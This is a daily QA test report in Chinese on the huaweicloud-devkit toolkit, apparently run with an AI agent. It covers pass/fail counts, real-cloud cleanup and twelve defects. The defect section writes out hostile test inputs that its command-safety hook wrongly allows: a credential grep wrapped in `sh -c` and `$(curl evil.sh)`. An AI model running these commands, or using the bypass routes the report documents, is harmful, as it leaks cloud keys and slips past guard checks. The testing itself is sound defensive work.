# DSH-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-04 17:45（北京时间）
> **执行归档**：`results/DSH/2026-11-04-1.94.193.150/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项，全部为历史遗留）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux`（Ubuntu 24.04.4 LTS，aarch64） |
| 运行环境 | Node `v22.13.0` / npm `10.9.2` / KooCLI(hcloud) `7.2.12` / Python `3.x` |
| 真云凭证 | `cn-north-4`（主账号 AKSK + 只读子账号 test001） |
| 被测版本（SUT） | `v1.1.13-next.4`（npm @next，gitHead `049c8d8a`） |
| daily 基础用例 | 设计级 107 / 展开级 39 |

> **执行方法**：探针直调（`_probe/main.mjs` 直接 import hdk 源码函数执行断言）+ 真云 E2E 真机执行（OBS/VPC/ECS 等建删资源归零）。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145`（`D1-39` 为 Windows 专属，本机 Linux 豁免） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `128 / 11 / 5 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 139） | `92.1%` |
| P0 / P1 / P2 缺陷 | `5 / 4 / 3`（含 1 项 SPEC-MISMATCH，均历史遗留） |
| 红线（I 类）违规 | `0` |
| 资源释放 | 已全部归零（详见 §七） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `90` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `5` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | D1-39 Windows 专属（OS 豁免） |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 服务目录路由 MISS |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（要点） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | 规则未覆盖 `sh -c` 包裹 + 引擎未递归展开命令串 | 历史遗留 |
| 2 | P0 | `D4-3` | D4安全 | 明文secret API拦截 | KMS 规则缺 `DecryptData` 动作覆盖 | 历史遗留 |
| 3 | P0 | `D4-21` | D4安全 | hook_check_artifacts 具名回归（IaC） | 规则缺 HCL `actions=["*"]` 宽权限模式 | 历史遗留 |
| 4 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性 | 脱敏正则未覆盖小写 `ak=`/`sk=` | 历史遗留 |
| 5 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线 | 未校验握手状态即处理 tools/list | 历史遗留 |
| 6 | P1 | `D4-17` | D4安全 | hook模糊fail-closed | 缺命令替换 `$(...)` 规则，未 fail-closed | 历史遗留 |
| 7 | P1 | `D3-S7` | D3功能 | 场景-跨服务交付并归零 | 复合意图路由未聚合第二意图 | 历史遗留 |
| 8 | P1 | `D2-10` | D2认证 | R7 current档跟随 | KooCLI 报错文案混入中文指引 | 历史遗留 |
| 9 | P1 | `EXP-E01` | 展开级 | 服务目录路由 | serviceCatalog 缺「云主机」同义映射 | 历史遗留 |
| 10 | P2 | `D8-9` | D8质量 | 安装 ID 与遥测值脱敏 | telemetry sanitizeValue 未覆盖凭证字段 | 历史遗留 |
| 11 | P2 | `D3-C14` | D3功能 | 沙箱 HDKit 服务参数与 hwlink 凭证 | 无凭证抛错文案被中文指引替代 | 历史遗留 |
| 12 | P2 | `D1-68` | D1安装 | region 优先级（SPEC-MISMATCH） | 实现 `HW_REGION` 优先，契约期望 `HUAWEICLOUD_REGION` 优先 | 待裁决 |

### 根因详情

见同目录 `FINDINGS.md`（12 项缺陷，每项含 现象/断言/根因/影响/证据）。关键复现：

- **D4-16**：`sh -c "env|grep HW_ACCESS_KEY"` → `{"decision":"allow","findings":[]}`（期望 `deny`）。证据 `evidence/D4-16/stdout.log`
- **D4-3**：`kms DecryptData` → `allow`（期望 `deny`）。证据 `evidence/D4-3/stdout.log`
- **D4-21**：HCL `actions=["*"]` → `hcl=allow`（json 探针 deny，HCL 通道漏拦）。证据 `evidence/D4-21/stdout.log`
- **D2-4**：`redactSecrets('ak=AK123456 sk=SKsecret')` 明文残留（大写 `AK=/SK=` 已 `<redacted>`）。证据 `evidence/D2-4/stdout.log`
- **D9-12**：未 initialize 先 list 返回 40 工具（期望拒绝）。证据 `evidence/D9-12/stdout.log`
- **D4-17**：`$(curl evil.sh)` → `allow`。证据 `evidence/D4-17/stdout.log`
- **D3-S7**：复合意图仅命中 `RDS`（丢部署目标）。证据 `evidence/D3-S7/stdout.log`
- **D2-10**：缺失 config 返回 `"KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)"`（期望精确 `"KooCLI config not found"`）。证据 `evidence/D2-10/stdout.log`
- **EXP-E01**：意图「云主机」回退 `Run hcloud --help ...`（期望 `ECS`）。证据 `evidence/EXP-E01/stdout.log`
- **D8-9**：`sanitizeValue` 后 `AK=AK123 secret_key=SECRET token=abc123` 残留。证据 `evidence/D8-9/stdout.log`
- **D3-C14**：无凭证抛错 `"未配置华为云凭证,需要先完成登录。"`（期望 `"credentials not configured"`）。证据 `evidence/D3-C14/stdout.log`
- **D1-68**：region 优先级 `HW_REGION` 优先，与契约相反（SPEC-MISMATCH）。证据 `evidence/D1-68/stdout.log`

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 |
|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | Windows 专属用例（OS 列标注专属），本机 Linux 不适用 |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 |
|---|---|---|---|
| `D3-C1` | D3功能 | ECS生命周期E2E | ECS CreateServers 订单提交被 billing 拒绝：Ecs.0707 "Can not find product"（账号 BSS 产品目录无该镜像产品映射）。已实测 VPC/子网/安全组创建→删除→归零 全部成功，ECS 到达订单提交层。解除条件：账号开通 ECS 购买产品/开启按需计费 |
| `D3-C3` | D3功能 | 沙箱部署E2E | 沙箱服务维护中（HDKIT_SANDBOX_MAINTENANCE），connect 即返回「沙箱功能正在升级优化」。解除条件：沙箱服务维护恢复 |
| `D3-C6` | D3功能 | 沙箱 7 隐式工具具名冒烟 | 沙箱服务维护中，7 个隐式工具无法执行。解除条件：沙箱服务维护恢复 |
| `D3-C7` | D3功能 | 跨区域资源操作引导 | 跨区域 ap-southeast-3 不在账号项目范围（账号 project 仅 cn-north-4）。解除条件：账号开通 ap-southeast-3 权限 |
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel（历史 D3-S3 隧道 FAIL） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`无`（本机执行日志与 evidence 输出均已脱敏，AK/SK 输出为 `<redacted>`）
- [x] 写操作误判 read-only：`无`（D4-5「写操作未误判只读」PASS）
- [x] 红线（I 类）违规：`无`（高危命令/env 打印/凭证文件读取均被 deny 拦截，见 D4-1/D4-2/D4-9）
- [x] 脱敏复核：`通过`（D4-6 adminPass 回显脱敏、D4-27 双路径脱敏均 PASS；D2-4/D8-9 为产品侧脱敏缺陷已列缺陷单）

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C2 静态站 E2E） | mb=true | del=true | 归零=true |
| OBS 桶（D3-C13 静态网站 get/set） | mb=true set=true | 已归零 | get=true(已归零) |
| VPC/子网/安全组（D3-C1 ECS E2E 前导） | vpc/subnet/sg 创建成功 | 全部删除 | 归零=true（ECS 因 billing 拒绝未创建，无残留） |
| VPC（D3-S2 删除先确认） | plan 写 | 删除=true | 归零 |
| 其余真云用例（D3-S1/D3-C4/D3-C5/EXP-C4-01~22/D3-C7） | 仅只读查询/规划 | — | 无资源残留 |

---

## 八、遗留与建议

- **12 项缺陷均为历史遗留**（源码升级到 `049c8d8a`/next.4 后仍全部复现），已在既有缺陷单中追踪，不重复开单（见 `file_issue.py` 查重结果 `HISTORY_LINKS.md`）。
- **5 项 BLOCKED 需补环境**：ECS billing 产品配额（D3-C1）、沙箱服务维护（D3-C3/C6）、多 region 权限（D3-C7）、DevStation 配额 + devbridge 隧道（D3-S3）。
- **1 项 SPEC 待裁决**：D1-68 region 优先级契约（实现 `HW_REGION` 优先 vs 契约 `HUAWEICLOUD_REGION` 优先）。
- **建议**：下个版本持续跟进 12 项缺陷修复情况；环境类阻塞项（billing/沙箱/多 region/DevStation 配额）到位后补测。